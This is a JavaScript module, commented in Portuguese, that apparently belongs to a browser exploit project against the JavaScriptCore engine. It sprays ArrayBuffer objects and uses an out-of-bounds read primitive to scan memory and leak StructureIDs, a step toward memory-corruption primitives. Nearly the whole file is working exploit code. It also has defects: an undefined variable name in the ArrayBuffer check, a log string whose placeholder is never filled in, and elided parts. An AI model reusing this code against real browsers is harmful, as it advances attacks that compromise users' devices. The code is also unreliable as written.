// js/script3/readStructureIDs.mjs (VERSÃO DE DIAGNÓSTICO SIMPLIFICADA)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3, LONG_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const MAX_SPRAY_OBJS_FOR_ID_LEAK_DIAG = 10; // Muito Reduzido
const DEFAULT_AB_SIZE_FOR_ID_LEAK_DIAG = 64;

async function findAndLogStructureIDInternal_DIAG(objectFactory, objectTypeName, verificationLogicFn, logFn = logS3, currentAttemptInfo = "") {
    const FNAME = `findAndLogStructureIDInternal_DIAG<${objectTypeName}>`;
    logFn(`  [${FNAME}] INICIANDO ${currentAttemptInfo}`, "info");

    if (!oob_array_buffer_real) {
        logFn(`  [${FNAME}] ERRO: Ambiente OOB não configurado.`, "error");
        return null;
    }

    logFn(`  [${FNAME}] Pulverizando ${MAX_SPRAY_OBJS_FOR_ID_LEAK_DIAG} instâncias de ${objectTypeName}...`, "info");
    let sprayedObjects = [];
    for (let i = 0; i < MAX_SPRAY_OBJS_FOR_ID_LEAK_DIAG; i++) {
        try { sprayedObjects.push(objectFactory()); } catch (e) { /* ignorar */ }
    }
    if (sprayedObjects.length === 0) {
        logFn(`  [${FNAME}] Nenhum objeto ${objectTypeName} pulverizado.`, "warn");
        return null;
    }
    logFn(`  [${FNAME}] ${sprayedObjects.length} objetos pulverizados. Pausando...`, "good");
    await PAUSE_S3(50); // Pausa curta

    let foundStructureID = null;
    const structureIdOffsetInCell = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const readUnitForScan = 4;

    // Range de varredura MUITO reduzido para diagnóstico
    const searchStart = Math.max(0, (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 128);
    const searchEnd = Math.min(oob_array_buffer_real.byteLength - readUnitForScan - 8, searchStart + 512); // Apenas 512 bytes de varredura

    logFn(`  [${FNAME}] Varrendo de ${toHex(searchStart)} a ${toHex(searchEnd)} (oob_real_len: ${toHex(oob_array_buffer_real.byteLength)})`, "info");

    for (let candidateBaseAbsOffset = searchStart; candidateBaseAbsOffset < searchEnd; candidateBaseAbsOffset += 8) {
        if (!oob_array_buffer_real) {
            logFn(`  [${FNAME}] ERRO CRÍTICO: oob_array_buffer_real nulo durante varredura!`, "error");
            break;
        }
        try {
            const verificationResult = await verificationLogicFn(candidateBaseAbsOffset, objectTypeName, logFn);
            if (verificationResult !== null && verificationResult !== undefined) {
                foundStructureID = verificationResult;
                break;
            }
        } catch (e_verify) { /* Silencioso */ }
    }

    sprayedObjects = null;
    if (foundStructureID === null) {
        logFn(`  [${FNAME}] StructureID para ${objectTypeName} não encontrado em ${currentAttemptInfo}.`, "warn");
    }
    logFn(`  [${FNAME}] CONCLUÍDO`, "info");
    return foundStructureID;
}

// Funções de verificação (manter as mesmas da última vez, mas elas serão chamadas com menos frequência)
async function verifyArrayBufferAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const sizeOffsetInABObject = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
    const FNAME_VERIFY = `verifyAB_${typeName}`;
    try {
        if (baseAbsOffsetInOOB + Math.max(sizeOffsetInABObject + 4, structureIdOffset + 4) > oob_array_buffer_real.byteLength) return null;
        const potentialSize = oob_read_absolute(baseAbsOffsetInOOB + sizeOffsetInAB, 4, logFn);
        if (potentialSize === DEFAULT_AB_SIZE_FOR_ID_LEAK_DIAG) { // Usar o tamanho de diagnóstico
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
            if (structureID !== 0 && structureID !== 0xFFFFFFFF && (structureID & 0xF0000000) === 0) {
                logFn(`  [${FNAME_VERIFY}] Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: Tamanho OK. StructureID: ${toHex(structureID)}`, "leak");
                return structureID;
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}
// ... (manter verifyJSFunctionAndReturnID e verifyGenericJSObjectAndReturnID como na última versão)
async function verifyJSFunctionAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const executableOffset = parseInt(JSC_OFFSETS.JSFunction.M_EXECUTABLE_OFFSET, 16);
    const FNAME_VERIFY = `verifyFunc_${typeName}`;
    try {
        if (baseAbsOffsetInOOB + Math.max(executableOffset + 8, structureIdOffset + 4) > oob_array_buffer_real.byteLength) return null;
        const ptr = oob_read_absolute(baseAbsOffsetInOOB + executableOffset, 8, logFn);
        if (isAdvancedInt64Object(ptr) && (ptr.low() !== 0 || ptr.high() !== 0) && ptr.low() !== 0xFFFFFFFF) {
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
             if (structureID !== 0 && structureID !== 0xFFFFFFFF && (structureID & 0xF0000000) === 0) {
                logFn(`  [${FNAME_VERIFY}] Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: ExecutablePtr OK. ID: ${toHex(structureID)}`, "leak");
                return structureID;
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}

async function verifyGenericJSObjectAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const butterflyOffset = parseInt(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 16);
    const FNAME_VERIFY = `verifyObj_${typeName}`;
    try {
        if (baseAbsOffsetInOOB + Math.max(butterflyOffset + 8, structureIdOffset + 4) > oob_array_buffer_real.byteLength) return null;
        const ptr = oob_read_absolute(baseAbsOffsetInOOB + butterflyOffset, 8, logFn);
        if (isAdvancedInt64Object(ptr)) {
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
            if (structureID !== 0 && structureID !== 0xFFFFFFFF && (structureID & 0xF0000000) === 0) {
                logFn(`  [${FNAME_VERIFY}] Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: ButterflyPtr OK. ID: ${toHex(structureID)}`, "leak");
                return structureID;
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}


export async function discoverStructureIDs() {
    const FNAME_MAIN = "discoverStructureIDs_DIAG";
    logS3(`==== INICIANDO Descoberta de StructureIDs (S3) v1.5 (Diagnóstico) ====`, "test", FNAME_MAIN);
    const results = { ArrayBuffer: null /*, JSFunction: null, JSObjectGeneric: null*/ }; // Testar um de cada vez
    const MAX_GLOBAL_ATTEMPTS_DIAG = 1;

    const typesToDiscover = [
        { name: "ArrayBuffer", factory: () => new ArrayBuffer(DEFAULT_AB_SIZE_FOR_ID_LEAK_DIAG), verifier: verifyArrayBufferAndReturnID, resultField: "ArrayBuffer" },
        // { name: "JSFunction", factory: () => function() { let a=1; return a+1; }, verifier: verifyJSFunctionAndReturnID, resultField: "JSFunction" },
        // { name: "JSObjectGeneric", factory: () => ({a:1, b:2}), verifier: verifyGenericJSObjectAndReturnID, resultField: "JSObjectGeneric" },
    ];

    for (let attempt = 1; attempt <= MAX_GLOBAL_ATTEMPTS_DIAG; attempt++) {
        logS3(`--- [${FNAME_MAIN}] Tentativa Global de Descoberta #${attempt}/${MAX_GLOBAL_ATTEMPTS_DIAG} ---`, "info");

        for (const typeInfo of typesToDiscover) {
            if (results[typeInfo.resultField] && attempt > 1) continue; // Não repetir se já encontrou na primeira tentativa

            logS3(` [${FNAME_MAIN}] Preparando para ${typeInfo.name}...`, "info");
            await triggerOOB_primitive(logS3);
            if (!oob_array_buffer_real) {
                logS3(` [${FNAME_MAIN}] Falha OOB, pulando ${typeInfo.name}.`, "error");
                continue;
            }
            results[typeInfo.resultField] = await findAndLogStructureIDInternal_DIAG(
                typeInfo.factory,
                typeInfo.name,
                typeInfo.verifier,
                logS3,
                `GlobalAttempt#${attempt}`
            );
            clearOOBEnvironment(logS3);
            await PAUSE_S3(SHORT_PAUSE_S3); // Pausa mais curta entre os tipos
        }

        if (Object.values(results).every(val => val !== null && val !== undefined)) {
            break;
        }
        if (attempt < MAX_GLOBAL_ATTEMPTS_DIAG) {
            logS3(` [${FNAME_MAIN}] Pausa antes da próxima tentativa global...`, "info");
            await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa média entre tentativas globais
        }
    }

    logS3("--- [${FNAME_MAIN}] Resultados Finais da Descoberta ---", "test");
    // ... (logging dos resultados) ...
    logS3(`==== [${FNAME_MAIN}] Descoberta de StructureIDs (Diagnóstico) CONCLUÍDA ====`, "test");
}
